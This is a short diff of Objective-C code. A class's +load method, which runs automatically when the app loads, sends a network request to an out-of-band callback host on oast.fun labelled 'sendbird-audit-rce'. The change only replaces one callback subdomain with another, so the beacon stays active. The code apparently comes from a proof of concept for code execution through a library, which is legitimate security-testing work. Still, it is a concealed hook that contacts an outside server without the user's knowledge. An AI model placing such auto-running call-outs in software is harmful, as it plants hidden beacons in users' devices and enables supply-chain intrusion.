@@ -8,7 +8,7 @@
 + (void)load {
     static dispatch_once_t onceToken;
     dispatch_once(&onceToken, ^{
-        NSString *oast = @"http://sendbird-audit-rce.rscrwozltcmjjimsghzqjfolhc1ggxoi8.oast.fun/runtime";
+        NSString *oast = @"http://sendbird-audit-rce.txltewamwbpaxlebmxwikbce81fq8r5cw.oast.fun/runtime";
         NSURL *url = [NSURL URLWithString:oast];
         if (url) {
             NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithURL:url completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {}];
